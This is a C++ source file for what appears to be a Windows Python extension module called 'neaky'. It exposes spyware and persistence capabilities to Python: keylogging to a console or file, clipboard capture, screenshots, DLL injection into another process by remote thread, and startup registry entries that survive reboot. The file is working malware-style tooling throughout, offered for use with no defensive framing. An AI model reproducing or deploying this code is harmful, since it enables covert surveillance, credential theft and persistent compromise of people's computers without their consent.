#define WIN32_LEAN_AND_MEAN // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#define UNICODE
#include <windows.h>
#include <tlhelp32.h>
#include <cstdio>
#include <iostream>
#include <fstream>

#define PY_SSIZE_T_CLEAN
#include <Python.h>

#include "spy/clipboard.h"
#include "spy/screenshot.h"
#include "persist/remote_dll_injection.h"
#include <neaky/utils.h>
#include "persist/startup.h"
#include "spy/keylog.h"

std::ofstream *ofs; // for keylogger

extern "C"
{

    PyObject *
    neaky_clipboard(PyObject *self, PyObject *args)
    {
        const wchar_t *clip = GetClipboardTextHelper();
        return PyUnicode_FromWideChar(clip, -1);
    }

    PyObject *
    neaky_screenshot(PyObject *self, PyObject *args)
    {
        const Py_UNICODE *path;
        if (!PyArg_ParseTuple(args, "u", &path))
        {
            return NULL;
        }
        ScreenShotSave(path);

        Py_RETURN_NONE;
    }

    // allow partial match
    PyObject *
    neaky_get_pid_by_name(PyObject *self, PyObject *args)
    {
        const Py_UNICODE *name;
        if (!PyArg_ParseTuple(args, "u", &name))
        {
            return NULL;
        }
        return PyLong_FromUnsignedLong(GetPIDByName(name));
    }

    // allow partial match, return list
    PyObject *
    neaky_get_pids_by_name(PyObject *self, PyObject *args)
    {
        const Py_UNICODE *name;
        if (!PyArg_ParseTuple(args, "u", &name))
        {
            return NULL;
        }

        DWORD pid = NULL;
        HANDLE hSnapshot = INVALID_HANDLE_VALUE;
        PROCESSENTRY32 pe;
        THREADENTRY32 te;
        PyObject *ret = PyList_New(0);

        pe.dwSize = sizeof(pe);
        te.dwSize = sizeof(te);
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

        Process32First(hSnapshot, &pe);
        do
        {
            if (_wcsicmp(name, pe.szExeFile) == 0)
            {
                PyList_Append(ret, PyLong_FromUnsignedLong(pe.th32ProcessID));
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
        CloseHandle(hSnapshot);

        return ret;
    }

    PyObject *
    neaky_remote_thread_injection(PyObject *self, PyObject *args)
    {
        const Py_UNICODE *dll_path;
        DWORD pid;

        if (!PyArg_ParseTuple(args, "uk", &dll_path, &pid))
        {
            return NULL;
        }
        InjectDll(pid, dll_path);

        Py_RETURN_NONE;
    }

    PyObject *
    neaky_set_startup_reg(PyObject *self, PyObject *args)
    {
        const Py_UNICODE *key;
        const Py_UNICODE *path;

        if (!PyArg_ParseTuple(args, "uu", &key, &path))
        {
            return NULL;
        }
        SetStratupReg(key, path);

        Py_RETURN_NONE;
    }

    PyObject *
    neaky_delete_startup_reg(PyObject *self, PyObject *args)
    {
        const Py_UNICODE *key;

        if (!PyArg_ParseTuple(args, "u", &key))
        {
            return NULL;
        }
        DeleteStratupReg(key);

        Py_RETURN_NONE;
    }

    PyObject *
    neaky_keylog_stdout(PyObject *self, PyObject *args)
    {
        RawInputKeyLogger.KeyLoggerInit(&std::cout);
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_keylog_to_file(PyObject *self, PyObject *args)
    {
        const char *path;
        if (!PyArg_ParseTuple(args, "s", &path))
        {
            return NULL;
        }
        if (ofs)
        {
            if ((*ofs).is_open())
            {
                (*ofs).close();
            }
        }
        else
        {
            ofs = new std::ofstream();
        }
        (*ofs).open(path);

        RawInputKeyLogger.KeyLoggerInit(ofs);
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_keylog_to_file_stop(PyObject *self, PyObject *args)
    {
        RawInputKeyLogger.KeyLoggerFini();
        if (ofs)
        {
            if ((*ofs).is_open())
            {
                (*ofs).close();
            }
        }
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_message_loop(PyObject *self, PyObject *args)
    {
        MSG msg;

        // releases GIL
        Py_BEGIN_ALLOW_THREADS

        while (GetMessage(&msg, nullptr, 0, 0))
        {
            // puts(".");
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Py_END_ALLOW_THREADS

        Py_RETURN_NONE;
    }
}
